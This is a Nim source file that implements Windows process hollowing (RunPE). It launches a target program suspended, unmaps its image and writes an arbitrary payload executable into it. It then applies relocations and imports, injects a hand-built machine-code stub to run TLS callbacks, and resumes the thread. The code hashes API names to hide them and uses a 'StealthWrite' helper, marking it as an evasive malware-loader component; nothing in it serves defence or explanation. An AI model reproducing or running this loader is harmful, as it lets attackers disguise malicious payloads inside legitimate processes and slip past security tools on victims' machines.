import winim
import ../core/resolver, ../core/masking, ../core/syscalls, ../core/utils

# Helper to map RVA to File Offset
proc to_offset(rva: uint32, nt: ptr IMAGE_NT_HEADERS64): uint32 =
    let sectionHeaderAddr = cast[uint](addr nt.OptionalHeader) + nt.FileHeader.SizeOfOptionalHeader.uint
    let pSections = cast[ptr UncheckedArray[IMAGE_SECTION_HEADER]](sectionHeaderAddr)
    for i in 0..<nt.FileHeader.NumberOfSections.int:
        let pSec = pSections[i]
        let vAddr = pSec.VirtualAddress.uint32
        let vSize = pSec.Misc.VirtualSize.uint32
        if rva >= vAddr and rva < (vAddr + vSize):
            return rva - vAddr + pSec.PointerToRawData.uint32
    return rva

# Helper for secure writing to remote process
proc StealthWrite(hProc: HANDLE, pDst: pointer, pSrc: pointer, size: int): bool =
    var bytesWritten: SIZE_T
    let status = NtWriteVirtualMemory(hProc, pDst, pSrc, size.SIZE_T, addr bytesWritten)
    if status != 0 or bytesWritten != size.SIZE_T:
        return false
    return true

# Helper to map PE section characteristics to Windows memory protection constants
proc get_section_protection(characteristics: uint32): uint32 =
    let executable = (characteristics and 0x20000000.uint32) != 0 # MEM_EXECUTE
    let readable = (characteristics and 0x40000000.uint32) != 0   # MEM_READ
    let writeable = (characteristics and 0x80000000.uint32) != 0  # MEM_WRITE

    if executable:
        if readable:
            if writeable: return PAGE_EXECUTE_READWRITE
            else: return PAGE_EXECUTE_READ
        else:
            if writeable: return PAGE_EXECUTE_READ # Fallback
    else:
        if readable:
            if writeable: return PAGE_READWRITE
            else: return PAGE_READONLY
        else:
            if writeable: return PAGE_READWRITE # Fallback
    return PAGE_READWRITE

type IMAGE_TLS_DIRECTORY64 = object
    StartAddressOfRawData, EndAddressOfRawData, AddressOfIndex, AddressOfCallBacks: uint64
    SizeOfZeroFill, Characteristics: uint32

# Basic RunPE / Process Hollowing implementation
proc run_pe*(payload_bytes: seq[byte], target_path: string): HANDLE =
    # log_debug("[Hollowing] Starting Process Hollowing (RunPE)...")
    # log_debug("[Hollowing] Target: " & target_path)

    var si: STARTUPINFOA
    var pi: PROCESS_INFORMATION
    si.cb = sizeof(si).DWORD

    var remoteStub: pointer = nil
    var stubSize: SIZE_T = 0

    # 1. Create Target Process in SUSPENDED state
    if CreateProcessA(target_path, nil, nil, nil, FALSE, CREATE_SUSPENDED, nil, nil, addr si, addr pi) == 0:
        # log_debug("[Hollowing] Failed to create target process: " & $GetLastError())
        return 0

    # log_debug("[Hollowing] Target Created. PID: " & $pi.dwProcessId)

    # 2. Get Thread Context
    var ctx: CONTEXT
    ctx.ContextFlags = CONTEXT_FULL
    if NtGetContextThread(pi.hThread, addr ctx) != 0:
        # log_debug("[Hollowing] Failed to get context")
        TerminateProcess(pi.hProcess, 0); return 0

    # log_debug("[Hollowing] Initial RIP: 0x" & cast[uint](ctx.Rip).toHex())
    let remotePeb = cast[pointer](ctx.Rdx)
    var imageBase: pointer
    if NtReadVirtualMemory(pi.hProcess, cast[pointer](cast[uint](remotePeb) + 0x10), addr imageBase, sizeof(imageBase), nil) != 0:
        # log_debug("[Hollowing] Failed to read ImageBase from PEB")
        TerminateProcess(pi.hProcess, 0); return 0
    
    # log_debug("[Hollowing] Original ImageBase: 0x" & cast[uint](imageBase).toHex())

    # 3. Unmap original image
    let ntdll = get_module_base(hash_api("ntdll.dll"))
    type NtUnmapViewOfSectionFn = proc(hProcess: HANDLE, BaseAddress: pointer): NTSTATUS {.stdcall.}
    let pNtUnmap = cast[NtUnmapViewOfSectionFn](get_proc_address_hashed(ntdll, hash_api("NtUnmapViewOfSection")))
    if pNtUnmap != nil:
        discard pNtUnmap(pi.hProcess, imageBase)
        # log_debug("[Hollowing] Unmapped image.")

    # 4. Parse Payload
    let pPayload = unsafeAddr payload_bytes[0]
    let pDos = cast[ptr IMAGE_DOS_HEADER](pPayload)
    let pNt = cast[ptr IMAGE_NT_HEADERS64](cast[uint](pPayload) + pDos.e_lfanew.uint)
    let payloadImageBase = cast[pointer](pNt.OptionalHeader.ImageBase)
    let payloadSize = pNt.OptionalHeader.SizeOfImage

    # 5. Allocate Memory
    var remoteBase = payloadImageBase
    var regionSize = payloadSize.SIZE_T
    var status = NtAllocateVirtualMemory(pi.hProcess, addr remoteBase, 0, addr regionSize, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
    if status != 0:
        remoteBase = nil
        status = NtAllocateVirtualMemory(pi.hProcess, addr remoteBase, 0, addr regionSize, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
        if status != 0:
             # log_debug("[Hollowing] Allocation Failed: 0x" & cast[uint32](status).toHex())
             TerminateProcess(pi.hProcess, 0); return 0

    # log_debug("[Hollowing] Memory allocated at: 0x" & cast[uint](remoteBase).toHex())
    let delta = cast[int64](remoteBase) - cast[int64](pNt.OptionalHeader.ImageBase)

    # Write Headers
    if not StealthWrite(pi.hProcess, remoteBase, pPayload, pNt.OptionalHeader.SizeOfHeaders.int):
        TerminateProcess(pi.hProcess, 0); return 0

    # 6. Write Sections & Apply Protections
    # log_debug("[Hollowing] Mapping sections...")
    let sectionHeaderAddr = cast[uint](addr pNt.OptionalHeader) + pNt.FileHeader.SizeOfOptionalHeader.uint
    let pSections = cast[ptr UncheckedArray[IMAGE_SECTION_HEADER]](sectionHeaderAddr)
    let numSections = pNt.FileHeader.NumberOfSections.int

    for i in 0..<numSections:
        let pSec = pSections[i]
        let pSrc = cast[pointer](cast[uint](pPayload) + pSec.PointerToRawData.uint)
        let pDst = cast[pointer](cast[uint](remoteBase) + pSec.VirtualAddress.uint)
        let rawSize = pSec.SizeOfRawData
        
        if rawSize > 0:
            if not StealthWrite(pi.hProcess, pDst, pSrc, rawSize.int):
                 # log_debug("[Hollowing]   ??Failed to write section " & $i)
                 discard
    
    # log_debug("[Hollowing] Sections mapped. Applying Relocations...")

    # Apply Relocations
    if delta != 0:
        let relocDir = pNt.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]
        if relocDir.VirtualAddress > 0 and relocDir.Size > 0:
            var currentReloc = cast[ptr IMAGE_BASE_RELOCATION](cast[uint](pPayload) + to_offset(cast[uint32](relocDir.VirtualAddress), pNt).uint)
            let relocEnd = cast[uint](currentReloc) + relocDir.Size.uint
            while cast[uint](currentReloc) < relocEnd and currentReloc.SizeOfBlock > 0:
                let count = (cast[uint32](currentReloc.SizeOfBlock) - cast[uint32](sizeof(IMAGE_BASE_RELOCATION))) div 2
                let pEntries = cast[ptr UncheckedArray[uint16]](cast[uint](currentReloc) + sizeof(IMAGE_BASE_RELOCATION).uint)
                let pageRva = currentReloc.VirtualAddress
                for k in 0..<count.int:
                    let entry = pEntries[k]
                    let relocType = entry shr 12
                    let offset = entry and 0xFFF
                    if relocType == IMAGE_REL_BASED_DIR64:
                         let patchAddr = cast[pointer](cast[uint](remoteBase) + pageRva.uint + offset.uint)
                         var val: uint64
                         if NtReadVirtualMemory(pi.hProcess, patchAddr, addr val, sizeof(val), nil) == 0:
                             val += cast[uint64](delta)
                             discard NtWriteVirtualMemory(pi.hProcess, patchAddr, addr val, sizeof(val), nil)
                currentReloc = cast[ptr IMAGE_BASE_RELOCATION](cast[uint](currentReloc) + currentReloc.SizeOfBlock.uint)

    # IAT Resolution
    # log_debug("[Hollowing] Resolving IAT...")
    type HollowingImportDescriptor = object
        OriginalFirstThunk, TimeDateStamp, ForwarderChain, Name, FirstThunk: uint32
    let importDir = pNt.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT]
    if importDir.VirtualAddress > 0:
        var pImportDesc = cast[ptr HollowingImportDescriptor](cast[uint](pPayload) + to_offset(cast[uint32](importDir.VirtualAddress), pNt).uint)
        while pImportDesc.Name != 0:
            let libName = $cast[cstring](cast[uint](pPayload) + to_offset(pImportDesc.Name, pNt).uint)
            # log_debug("[Hollowing]   IAT Library: " & libName)
            let hLib = LoadLibraryA(libName)
            if hLib != 0:
                var lookupRva = if pImportDesc.OriginalFirstThunk != 0: pImportDesc.OriginalFirstThunk else: pImportDesc.FirstThunk
                var origThunk = cast[ptr uint64](cast[uint](pPayload) + to_offset(lookupRva, pNt).uint)
                var thunkRva = pImportDesc.FirstThunk
                while origThunk[] != 0:
                    let rva = origThunk[]
                    var funcAddr: uint64 = 0
                    var importName = ""
                    if (rva and 0x8000000000000000.uint64) != 0:
                        let ordinal = rva and 0xFFFF
                        importName = "Ordinal:" & $ordinal
                        funcAddr = cast[uint64](GetProcAddress(hLib, cast[cstring](ordinal)))
                    else:
                        let pName = cast[ptr IMAGE_IMPORT_BY_NAME](cast[uint](pPayload) + to_offset(cast[uint32](rva), pNt).uint)
                        importName = $cast[cstring](addr pName.Name)
                        funcAddr = cast[uint64](GetProcAddress(hLib, cast[cstring](addr pName.Name)))
                    
                    if funcAddr != 0:
                        let remoteThunkAddr = cast[pointer](cast[uint](remoteBase) + thunkRva.uint)
                        if NtWriteVirtualMemory(pi.hProcess, remoteThunkAddr, addr funcAddr, sizeof(funcAddr), nil) == 0:
                            # log_debug("[Hollowing]     ??Resolved: " & importName & " -> 0x" & funcAddr.toHex())
                            discard
                        else:
                            # log_debug("[Hollowing]     ??Failed to write IAT for: " & importName)
                            discard
                    else:
                        # log_debug("[Hollowing]     ?�️ Could not find address for: " & importName)
                        discard
                    
                    origThunk = cast[ptr uint64](cast[uint](origThunk) + 8); thunkRva += 8
            pImportDesc = cast[ptr HollowingImportDescriptor](cast[uint](pImportDesc) + sizeof(HollowingImportDescriptor).uint)

    # 7. --- TLS Callbacks & Entry Point ---
    let tlsDir = pNt.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS]
    if tlsDir.VirtualAddress > 0:
        # log_debug("[Hollowing] TLS Directory found. Building startup stub...")
        let pTls = cast[ptr IMAGE_TLS_DIRECTORY64](cast[uint](pPayload) + to_offset(cast[uint32](tlsDir.VirtualAddress), pNt).uint)
        
        if pTls.AddressOfCallBacks != 0:
            let preferredBase = pNt.OptionalHeader.ImageBase
            let callbacksRva = cast[uint32](pTls.AddressOfCallBacks.uint64 - preferredBase.uint64)
            
            # Collect callbacks
            var callbacks: seq[pointer]
            var remoteCallbacksPtr = cast[pointer](cast[uint](remoteBase) + callbacksRva.uint)
            var currentCallbackVA: uint64
            
            while true:
                if NtReadVirtualMemory(pi.hProcess, remoteCallbacksPtr, addr currentCallbackVA, sizeof(currentCallbackVA), nil) != 0 or currentCallbackVA == 0:
                    break
                
                let cbRva = cast[uint32](currentCallbackVA.uint64 - preferredBase.uint64)
                let remoteCbAddr = cast[pointer](cast[uint](remoteBase) + cbRva.uint)
                callbacks.add(remoteCbAddr)
                remoteCallbacksPtr = cast[pointer](cast[uint](remoteCallbacksPtr) + 8)
            
            # --- Initialize TLS Index ---
            if pTls.AddressOfIndex != 0:
                let indexRva = cast[uint32](pTls.AddressOfIndex.uint64 - preferredBase.uint64)
                var tlsIndex: uint32 = 0
                discard NtWriteVirtualMemory(pi.hProcess, cast[pointer](cast[uint](remoteBase) + indexRva.uint), addr tlsIndex, sizeof(tlsIndex), nil)
                # log_debug("[Hollowing]   TLS Index initialized.")

            if callbacks.len > 0:
                # log_debug("[Hollowing]   Found " & $callbacks.len & " TLS callbacks. Generating stub...")
                var stub: seq[byte] = @[]
                
                # Prologue: Save original RSP and align stack (shadow space + align)
                stub.add(@[0x55.byte])                           # push rbp
                stub.add(@[0x48.byte, 0x89, 0xE5])               # mov rbp, rsp
                stub.add(@[0x48.byte, 0x83, 0xEC, 0x30])         # sub rsp, 30h
                
                # Execute each TLS callback
                for i, cb in callbacks:
                    # log_debug("[Hollowing]     Callback[" & $i & "]: 0x" & cast[uint](cb).toHex())
                    # mov rcx, ImageBase (arg1: DllHandle)
                    stub.add(@[0x48.byte, 0xB9])
                    let baseVal = cast[uint64](remoteBase)
                    for j in 0..7: stub.add(cast[byte]((baseVal shr (j * 8)) and 0xFF))
                    
                    # mov edx, 1 (arg2: DLL_PROCESS_ATTACH)
                    stub.add(@[0xBA.byte, 0x01, 0x00, 0x00, 0x00])
                    
                    # xor r8d, r8d (arg3: Reserved = NULL)
                    stub.add(@[0x45.byte, 0x31, 0xC0])
                    
                    # mov rax, callback_address
                    stub.add(@[0x48.byte, 0xB8])
                    let cbVal = cast[uint64](cb)
                    for j in 0..7: stub.add(cast[byte]((cbVal shr (j * 8)) and 0xFF))
                    
                    # call rax
                    stub.add(@[0xFF.byte, 0xD0])
                
                # Epilogue: Restore stack and jump to entry point
                stub.add(@[0x48.byte, 0x89, 0xEC])               # mov rsp, rbp
                stub.add(@[0x5D.byte])                           # pop rbp
                
                # mov rax, entry_point
                stub.add(@[0x48.byte, 0xB8])
                let entryAddr = cast[uint64](cast[uint](remoteBase) + pNt.OptionalHeader.AddressOfEntryPoint.uint)
                # log_debug("[Hollowing]     Real Entry Point: 0x" & entryAddr.toHex())
                for j in 0..7: stub.add(cast[byte]((entryAddr shr (j * 8)) and 0xFF))
                
                # jmp rax
                stub.add(@[0xFF.byte, 0xE0])
                
                # Allocate and inject stub
                stubSize = stub.len.SIZE_T
                if NtAllocateVirtualMemory(pi.hProcess, addr remoteStub, 0, addr stubSize, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE) == 0:
                    if StealthWrite(pi.hProcess, remoteStub, addr stub[0], stub.len):
                        # log_debug("[Hollowing]   Startup stub injected at 0x" & cast[uint](remoteStub).toHex())
                        ctx.Rip = cast[int64](remoteStub)
                    else:
                        # log_debug("[Hollowing]   Failed to write stub")
                        ctx.Rip = cast[int64](cast[uint](remoteBase) + pNt.OptionalHeader.AddressOfEntryPoint.uint)
                else:
                    # log_debug("[Hollowing]   Failed to allocate stub")
                    ctx.Rip = cast[int64](cast[uint](remoteBase) + pNt.OptionalHeader.AddressOfEntryPoint.uint)
            else:
                ctx.Rip = cast[int64](cast[uint](remoteBase) + pNt.OptionalHeader.AddressOfEntryPoint.uint)
        else:
            ctx.Rip = cast[int64](cast[uint](remoteBase) + pNt.OptionalHeader.AddressOfEntryPoint.uint)
    else:
        ctx.Rip = cast[int64](cast[uint](remoteBase) + pNt.OptionalHeader.AddressOfEntryPoint.uint)

    # --- Memory Protection Finalization ---
    # log_debug("[Hollowing] Finalizing memory protections...")
    
    # 1. Protect PE Headers
    var hAddr = remoteBase
    var hSize = pNt.OptionalHeader.SizeOfHeaders.SIZE_T
    var hOld: ULONG
    discard NtProtectVirtualMemory(pi.hProcess, addr hAddr, addr hSize, PAGE_READONLY, addr hOld)
    # log_debug("[Hollowing]   Headers set to PAGE_READONLY")

    # 2. Protect Sections
    for i in 0..<numSections:
        let pSec = pSections[i]
        var pDst = cast[pointer](cast[uint](remoteBase) + pSec.VirtualAddress.uint)
        var vSize = pSec.Misc.VirtualSize.SIZE_T
        let charas = pSec.Characteristics.uint32
        let prot = get_section_protection(charas)
        var old: ULONG
        # log_debug("[Hollowing]   Section " & $i & " (" & $cast[uint](pDst).toHex() & ") [Chars: 0x" & charas.toHex() & "] -> Protection: 0x" & prot.toHex())
        discard NtProtectVirtualMemory(pi.hProcess, addr pDst, addr vSize, prot.ULONG, addr old)

    # 8. Finalize: PEB & Context
    var pbi: PROCESS_BASIC_INFORMATION
    var retLen: ULONG
    if syscalls.NtQueryInformationProcess(pi.hProcess, 0, addr pbi, sizeof(pbi).ULONG, addr retLen) == 0:
        let remotePeb = pbi.PebBaseAddress
        # Update ImageBase in PEB (0x10 offset on x64)
        discard NtWriteVirtualMemory(pi.hProcess, cast[pointer](cast[uint](remotePeb) + 0x10), addr remoteBase, sizeof(pointer), nil)
    
    # Update protection for the stub (if it was allocated)
    if remoteStub != nil:
        var oldProt: ULONG
        var stubAddr = remoteStub
        var stubSizeProt = stubSize.SIZE_T
        discard NtProtectVirtualMemory(pi.hProcess, addr stubAddr, addr stubSizeProt, PAGE_EXECUTE_READ.ULONG, addr oldProt)

    if NtSetContextThread(pi.hThread, addr ctx) != 0:
        # log_debug("[Hollowing] ??Failed to set context")
        TerminateProcess(pi.hProcess, 0); return 0
    
    # 9. Resume
    if ResumeThread(pi.hThread) == cast[DWORD](-1):
        # log_debug("[Hollowing] Failed to resume: " & $GetLastError())
        TerminateProcess(pi.hProcess, 0); return 0
    
    # log_debug("[Hollowing] SUCCESS. Thread Resumed.")
    Sleep(2000)
    var ec: DWORD
    if bool(GetExitCodeProcess(pi.hProcess, addr ec)) and ec != STILL_ACTIVE:
        # log_debug("[Hollowing] ??DEAD! ExitCode: 0x" & ec.toHex())
        discard
    else:
        # log_debug("[Hollowing] ??ALIVE!")
        discard

    CloseHandle(pi.hThread)
    return pi.hProcess
